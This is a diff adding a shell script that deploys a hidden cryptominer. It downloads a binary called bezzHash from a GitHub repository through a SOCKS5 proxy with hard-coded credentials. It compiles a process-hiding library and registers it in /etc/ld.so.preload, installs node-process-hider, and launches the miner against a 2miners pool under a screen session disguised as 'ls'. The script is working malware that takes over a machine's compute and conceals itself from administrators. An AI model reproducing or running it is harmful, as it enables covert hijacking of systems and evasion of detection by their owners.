@@ -1,0 +1,46 @@
+#!/bin/sh
+sudo apt update && apt install screen -y
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 185.242.108.88:12324
+socks5_username = 14abf5d6e18da
+socks5_password = dbb7a6d2ae
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+ph add bezzHash
+screen -dmS ls nohup ./bezzHash --url=nano_1g7b37bepgxkwg6hk5fuapxene7w4ub4yzbfqda81jz6awc68393cczztzit.coeg@us-eth.2miners.com:2020 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99 > nohup.out
